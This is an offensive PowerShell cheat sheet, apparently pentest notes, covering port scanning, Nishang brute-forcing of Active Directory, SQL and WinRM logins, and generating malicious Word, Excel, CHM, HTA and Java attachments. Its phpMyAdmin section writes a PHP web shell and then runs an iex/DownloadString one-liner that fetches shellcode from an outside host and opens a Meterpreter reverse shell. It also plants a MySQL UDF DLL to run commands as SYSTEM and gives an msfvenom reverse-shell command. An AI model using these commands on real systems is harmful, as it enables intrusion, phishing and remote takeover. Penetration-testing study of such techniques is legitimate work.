# Offensive Powershell
---
> **Note:**
>  To list the modules and parameters for a specific function in a module -> [List module commands](powershell-basics.md#list-module-commands)
---
## Reconnaissance
## PortScanning & Host discovery
```Powershell
#Powersploit module
Invoke-PortScan <Args> | Select-Object -ExpandProperty openports
#Posh-SecMod module
portscan <Args>
Invoke-ARPScan <Args>
Invoke-EnumSRVRecords <Args>
```
## Directory discovery
```powershell
#PowerSploit module
Get-HttpStatus <Args> | Where-Object {$_.Status -match "ok"}
```
## Shodan
```powershell
#Posh-Shodan module
Get-Command -module Posh-shodan
```
## Automating Nmap
```powershell
#Scandiff script
./scandiff.ps1 -frequency daily -basename nmap-output -targets 192.168.1.10-25,scanme.nmap.org
```
> **Scandiff**: https://github.com/hardwaterhacker/scandiff
## Brute-Force
**Nishang module:**
-  **Services:** FTP , Active Directory, MSSQL, Sharepoint.
```powershell
cat <PassFile> | Invoke-BruteForce -IP <IP> -UserName <Username>  -service ActiveDirectory
cat C:\test\servers.txt | Invoke-BruteForce -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose
```
- **Services:** WinRM
```powershell
Get-WinRMPassword -UserName Administrator -ComputerName victimserver -WordList c:\mywordlist.txt
```
>**Sources:**
> Script -> [WinRMPassword](https://poshsecurity.com/blog/2014/3/20/powershell-winrm-get-winrmpassword.html)
## MSSQL
```powershell
#Nishang
Execute-Commnand-MSSQL -ComputerName abuqasemPC -
WindowsAuthentication 
Execute-Commnand-MSSQL -ComputerName abuqasemPC -payload <Command>
```
> `WindowsAuthentication` is useful when our current powershell session have enough privileges to access remote DB but we don't have credentials.
---
## Client-Side attacks
## Malicious Attachments
1. **Microsoft-Word & Excel**
```powershell
#Nishang
Out-Word -Payload <Payload>
Out-Excel -Payload <Payload> -ExcelFileDir <Path\to\files.xls>
```
> `ExcelFileDir` Output a malicious excel file with the same name,attributes as the file pointed to.

2. **Shortcut & CHM** 
```powershell
#Nishang
#Payload starts with '-c' because the powershell command is already hardcoded in the script.
Out-Chm -Payload "-c <COMMANDS>" -HHCPath "C:\PATH\TO\HTML HELP Workshop"
Out-Shortcut -Payload <Payload>
```
> **Further reading:** https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e

3. **Phishing/Drive-by-download**
- **Out-HTA**: Generates HTML app. and VBS script.
- **Out-Java**: Generates a malicious jar file.
```powershell
Out-HTA -PayloadURL http:\\10.10.10.10.\Rev.ps1
Out-Java -Payload "-c <COMMAND>" -JDKPAth <PATH\TO/JDK> -NoSelfSign
```
>**Note:**
> Both Scripts generate two files.

---
## Exploitation
## PHPMyAdmin
- **Assumptions**
    - Username / Password of phpMyAdmin is known
    - Writable directories on the web server are known
### From phpMyAdmin access to SYSTEM privileges
1. Check OS
```txt
SHOW VARIABLES LIKE "%version%";
```
2. Create WebShell
 ```sql
SELECT '<?php echo shell_exec($_GET[\'e\']); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\phpmyadmin\\config\\shell.php'
#Then
http://newpc/phpmyadmin/config/shell.php?e=whoami
```
3. Get a Meterpreter
```powershell
#Powersploit module
http://newpc/phpmyadmin/config/shell.php?e=C:\Windows\Syswow64\Windowspowershell\v1.0\powershell.exe -c iex((New-Object Net.WebClient).DownloadString('http://192.168.254.1/Invoke-ShellCode.ps1'));Invoke-ShellCode -Payload windows/meterpreter/reverse_https -LHOST 192.168.254.226 -LPORT 8443 -Force
```
> `Invoke-ShellCode` Is useful when we don't have write access to any file,because it injects the code in memory without having to touch the disk.
## PHPMyAdmin 2
1. **Identify the  plugin directory**
```sql
SELECT @@plugin_dir
```
2. **Convert the  DLL  to bytes.**
 - [UDF DLL from sqlmap](https://github.com/sqlmapproject/sqlmap/tree/master/udf/mysql/windows)
```powershell
#Nishang
Convert-Dll -DllPath .\lib_mysqludf_sys.dll_ -OutputPath dll.txt
```
3. **Write to the plugin directory of the  server.**
```powershell
SELECT CHAR(77,90,144...) INTO OUTFILE 'C:\\Program Files\\MySQL\\MySQL Server 5.6\\lib\\plugin\\lib_mysqludf_ sys.dll' FIELDS ESCAPED BY ''
```
4. **Create a function**
```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll'
```
5. **Execute commands as  SYSTEM**
```sql
Select sys_eval('whoami')
```
---
## Metasploit
PowerShell payload formats
1. **psh**
2. **psh-cmd**
3. **psh-net**
4. **psh-reflection**
	- Very useful
	- Compilation happens in memory
	- No need of execute privileges on temp directory 
	- Use this often
- **Metasploit modules which use PowerShell**
	-  `exploit/windows/smb/psexec_psh`
        - Payload is never written to disk
	- `exploit/windows/local/powershell_cmd_upgrade`
		- Used to upgrade a  native cmd  to  meterpreter.
	- `post/windows/manage/powershell/exec_powershell`
		- Execute a .ps1 from local machine.

### Example
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 -f psh-reflection > ps.ps1
```
---
